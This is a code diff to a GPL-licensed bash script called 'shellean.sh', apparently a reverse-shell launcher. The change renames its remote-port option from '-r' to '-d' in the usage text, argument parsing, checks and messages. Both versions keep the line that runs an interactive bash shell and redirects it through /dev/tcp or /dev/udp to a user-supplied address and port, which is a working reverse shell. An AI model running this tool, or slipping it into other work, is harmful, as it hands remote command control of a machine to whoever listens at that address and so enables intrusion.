@@ -28,7 +28,7 @@ license()
 
 help()
 {
-   echo '-> usage: /bin/bash shellean.sh [-p <Protocol> -a <Internet Protocol Address> -r <Remote Port>]';
+   echo '-> usage: /bin/bash shellean.sh [-p <Protocol> -a <Internet Protocol Address> -d <Destination Port>]';
    echo '-> options:';
    echo '';
    echo '-l -> Print the GPL license and exit.';
@@ -36,7 +36,7 @@ help()
    echo '-V -> Print the software version and exit.';
    echo '-p -> Specify the Protocol.'; 
    echo '-a -> Specify the Internet Protocol Address to connect to.';
-   echo '-r -> Specify the Remote Port to connect to.';
+   echo '-d -> Specify the Destination Port to connect to.';
 }
 
 version()
@@ -48,7 +48,7 @@ version()
   echo '--------------------------------------------------------------------------';
 }
 
-while getopts 'lhVp:a:r:' options;
+while getopts 'lhVp:a:d:' options;
 do
   case $options in
     l) license; exit;;
@@ -56,7 +56,7 @@ do
     V) version; exit;;
     p) protocol=$OPTARG;;
     a) address=$OPTARG;;
-    r) remote=$OPTARG;;    
+    d) destination=$OPTARG;;    
   esac
 done
 
@@ -113,9 +113,9 @@ elif [ -z $address ];
 
     # An IP address looks like the following 104.26.10.229, 4 sets of digits ranging from 0 - 255 separated by a period.
 
-elif [ -z $remote ];
+elif [ -z $destination ];
   then
-    echo '[!] -> You need to Specify a Remote Port';
+    echo '[!] -> You need to Specify a Destination Port';
     echo '';
     
     help;
@@ -157,9 +157,9 @@ else
   echo '[i] Starting shellean at:' $(date);
   echo '--------------------------------------------------------------------------';
 
-  echo '[i] Connecting to:' $address:$remote;
+  echo '[i] Connecting to:' $address:$destination;
 
-  /bin/bash -i >& /dev/$protocol/$address/$remote 0>&1;
+  /bin/bash -i >& /dev/$protocol/$address/$destination 0>&1;
 
   echo '--------------------------------------------------------------------------';
   echo '[i] Exiting shellean at:' $(date);
